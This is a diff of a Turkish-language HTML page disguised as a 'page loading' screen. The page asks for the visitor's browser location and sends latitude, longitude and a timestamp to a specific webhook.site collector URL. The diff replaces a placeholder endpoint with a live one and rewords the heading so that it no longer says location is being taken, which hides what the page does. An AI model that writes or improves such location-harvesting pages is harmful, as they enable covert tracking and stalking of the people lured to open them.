@@ -1,32 +1,53 @@
 <!DOCTYPE html>
-<html>
+<html lang="tr">
 <head>
   <meta charset="UTF-8">
   <title>Yükleniyor...</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      padding: 50px;
+    }
+  </style>
 </head>
 <body>
-  <h2>Lütfen bekleyin, konum alınıyor...</h2>
+  <h2>Sayfa yükleniyor, lütfen bekleyin...</h2>
+
   <script>
     if (navigator.geolocation) {
       navigator.geolocation.getCurrentPosition(function(position) {
-          const lat = position.coords.latitude;
-          const lon = position.coords.longitude;
+        const lat = position.coords.latitude;
+        const lon = position.coords.longitude;
 
-          // Gelecek adımda burayı senin webhook veya sunucunla değiştireceğiz
-          fetch("https://webhook.site/örnek-url", {
-              method: "POST",
-              headers: {
-                  "Content-Type": "application/json"
-              },
-              body: JSON.stringify({latitude: lat, longitude: lon})
-          });
+        // Konumu Webhook.site adresine gönder
+        fetch("https://webhook.site/fb1256ec-3cc0-4d46-9ebb-47e8def56c7b", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({
+            latitude: lat,
+            longitude: lon,
+            timestamp: new Date().toISOString()
+          })
+        });
 
-          document.body.innerHTML = "<h3>Teşekkürler! Konum alındı.</h3>";
+        document.body.innerHTML = `
+          <h2>Teşekkürler!</h2>
+          <p>Konumunuz başarıyla alındı.</p>
+        `;
       }, function(error) {
-          document.body.innerHTML = "<h3>Konum alınamadı. Lütfen izin verin.</h3>";
+        document.body.innerHTML = `
+          <h2>Konum Alınamadı</h2>
+          <p>Lütfen tarayıcınızdan konum izni verin.</p>
+        `;
       });
     } else {
-      document.body.innerHTML = "<h3>Tarayıcınız konum hizmetini desteklemiyor.</h3>";
+      document.body.innerHTML = `
+        <h2>Tarayıcınız desteklemiyor</h2>
+        <p>Konum özelliği desteklenmiyor.</p>
+      `;
     }
   </script>
 </body>
